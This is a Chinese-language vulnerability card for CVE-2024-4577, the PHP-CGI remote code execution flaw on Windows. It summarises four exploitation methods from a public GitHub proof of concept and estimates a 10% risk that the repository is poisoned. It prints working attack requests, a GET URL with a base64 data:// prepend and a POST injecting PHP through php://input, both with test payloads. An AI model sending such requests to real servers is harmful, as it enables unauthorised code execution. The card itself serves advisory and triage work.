## CVE-2024-4577-PHP-CGI远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP (Windows)

**危害等级:** 高危，允许未经身份验证的攻击者在受影响的服务器上执行任意代码。

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI mode)

**利用条件:** 目标系统为Windows，使用Apache和PHP-CGI，并且系统配置为使用某些代码页（存在"Best-Fit"行为）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个PHP-CGI的参数注入漏洞，影响在Windows上运行的PHP。当PHP在CGI模式下与Apache结合使用时，如果系统配置了特定的代码页，Windows可能会使用“Best-Fit”行为来替换命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，允许恶意用户将选项传递给PHP二进制文件，从而可能泄露源代码，运行任意PHP代码等。

**漏洞利用方式：**

1.  **EXP 1 (绕过WAF和默认场景):** 通过运行提供的Python脚本`CVE-2024-4577-PHP-RCE.py`，该脚本模拟FastCGI客户端与PHP-CGI通信，从而执行任意代码。该方法不需要 `allow_url_include`、`auto_prepend_file`、`auto_append_file` 配置，并且绕过WAF。
2.  **EXP 2 (SSRF场景):** 使用`data://`协议结合GET请求，通过URL传递参数来利用漏洞。例如：
    `http://PhpServerHost:PhpServerPort/php-cgi/php-cgi.exe?%add+cgi.force_redirect%3dXCANWIN+-d+allow_url_include%3d1+-d+auto_prepend_file%3d"data:XCANWIN/XCANWIN;base64,PD9waHAgZGllKCJUZSIuInNUIik7Pz4g"`
3.  **EXP 3 (默认场景):** 使用POST请求，通过`php://input`来包含PHP代码。
    `POST /php-cgi/php-cgi.exe?%add+cgi.force_redirect%3dXCANWIN+%add+allow_url_include%3don+%add+auto_prepend_file%3dphp%3a//input HTTP/1.1`
    `Host: PhpServerHost`
    `<?php die("Te"."sT");?>`
4.  **EXP 4 (默认场景):** 类似于EXP 3，但使用`REDIRECT-STATUS`头。

**有效性：**

从漏洞库信息，搜索引擎结果和提供的利用代码来看，该漏洞的POC已经公开，并且在野外已经存在利用。多个安全厂商已经发布了相关的分析报告和防护措施，证明该漏洞的有效性。

**投毒风险：**

`CVE-2024-4577-PHP-RCE.py`脚本本身主要功能是发送特制的FastCGI请求，用于触发漏洞，实现RCE。虽然脚本本身看起来是无害的，但是存在很小的潜在风险：

1.  **硬编码的IP地址/端口：**脚本中可以指定目标主机的IP和端口，攻击者可能通过诱导用户使用脚本，从而攻击特定的目标。
2.  **包含任意文件：** 脚本允许包含任意文件，这意味着如果攻击者可以控制`script_filename`变量，就可以读取敏感文件或执行恶意代码。
3. **FastCGI服务端:** EXP1 会建立FastCGI服务端,如果攻击者恶意利用,可能会导致拒绝服务攻击。

基于上述分析，存在一定的投毒风险，但可能性较低，估计在10%左右。

总体来说，该漏洞利用代码主要依赖于目标环境存在漏洞，并且利用代码的目的是为了验证漏洞的存在和实现RCE。作者的README.md中提及绕过WAF，但主要是通过改变利用方式实现的，并不属于投毒范畴。

**项目地址:** [a-roshbaik/CVE-2024-4577-PHP-RCE](https://github.com/a-roshbaik/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)